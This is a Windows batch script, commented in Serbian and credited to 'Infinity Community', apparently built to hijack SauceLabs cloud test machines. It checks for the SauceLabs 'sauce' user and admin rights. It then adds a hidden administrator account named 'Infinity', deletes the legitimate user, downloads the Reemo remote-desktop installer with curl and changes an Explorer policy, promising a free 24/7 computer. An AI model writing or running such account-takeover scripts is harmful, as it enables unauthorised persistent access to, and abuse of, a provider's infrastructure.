@echo off

echo [+] Credits:
echo [+] oxIceBear - Infinity Community -
timeout /t 1 /nobreak >nul
echo [+] oxIceBear - Infinity Community -
timeout /t 1 /nobreak >nul
echo [+] oxIceBear - Infinity Community -
timeout /t 1 /nobreak >nul
echo [+] LOGOVI:
echo [+] Detektujem saucelabs....

if exist C:\Users\sauce (
    goto nx
) else (
    color 4
    echo [+] Pokrenuo si ovaj program na tvojoj lokalnoj masini, molim te, pokreni na Saucelabs servicu.
    timeout /t 10 /nobreak >nul
    exit /b 1
)

:nx

echo Proveravam dali je program pokrenut kao Administrator...
timeout /t 3 /nobreak >nul

net session >nul 2>&1
if %errorLevel% == 0 (
    echo Pokrenut kao Administrator!
    timeout /t 2 /nobreak >nul
) else (
    echo Ovaj script treba da ima administratora!
    echo Molim te Desnim klikom klikni na program i pretisni "Run as administrator."
    timeout /t 10 /nobreak >nul
    exit /b 1
)


echo [+] Kreiranje novog korisnika...
net user Infinity /add
timeout /t 2 /nobreak >nul

echo [+] Dodeljivanje administratorskih privilegija korisniku Infinity...
net localgroup Administrators Infinity /add
timeout /t 2 /nobreak >nul

echo [+] Brisanje korisnika sauce...
net user sauce /delete

timeout /t 2 /nobreak >nul
echo [+] Korisnik sauce je uspešno izbrisan!
timeout /t 2 /nobreak >nul
echo.
echo Skidanje reemo-a...

curl -o "C:\Users\Infinity\Desktop\reemo.setup.x64.exe" https://download.reemo.io/reemo.setup.x64.exe 2> NUL
timeout /t 2 /nobreak >nul

echo [+] Podešavanje Group Policy za omogucavanje svih stavki na radnoj površini...
timeout /t 2 /nobreak >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDesktop /t REG_DWORD /d 0 /f
timeout /t 1 /nobreak >nul
echo.
echo Uspesno. Sada odi na Infinity nalog i uzivaj u 24/7 kompu free. Nezaboravi da udjes na Infinity Community!!!
echo Auto izlazenje za 6 sekunde...
timeout /t 3 /nobreak >nul